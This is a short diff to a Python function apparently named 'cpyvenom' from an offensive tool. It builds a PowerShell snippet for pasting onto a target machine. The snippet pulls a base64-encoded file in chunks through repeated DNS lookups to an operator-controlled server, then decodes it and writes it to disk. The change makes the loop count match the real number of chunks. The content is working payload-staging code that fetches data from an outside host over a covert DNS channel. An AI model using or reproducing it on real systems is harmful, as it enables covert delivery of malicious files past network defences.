@@ -340,7 +340,7 @@ def cpyvenom(inputfile,outputfile,payload,destination,block,dns_listening_port,c
             file_chunks = prepare_file(inputfile,block)
             text = """\nCopy from here:\n\n**********\n\n$FilePath="{}"\n$EncodedString =  '' \n""".format(destination)
             
-            text+= "for ($num = 1 ; $num -le 10 ; $num++)"
+            text+= "for ($num = 1 ; $num -le {0} ; $num++)".format(len(file_chunks)-1)
             text+= "{$current='c'+$num.ToString()+'.com'; $EncodedString+=(Resolve-DnsName $current "
             text+= "-Server {0} | Select-Object -Property Strings ).Strings ;Start-Sleep -s {1} }};".format(dns_domain,delay_between_calls)
             text += """\n$ByteArray = [System.Convert]::FromBase64String($EncodedString);\n[System.IO.File]::WriteAllBytes($FilePath, $ByteArray);\n"""
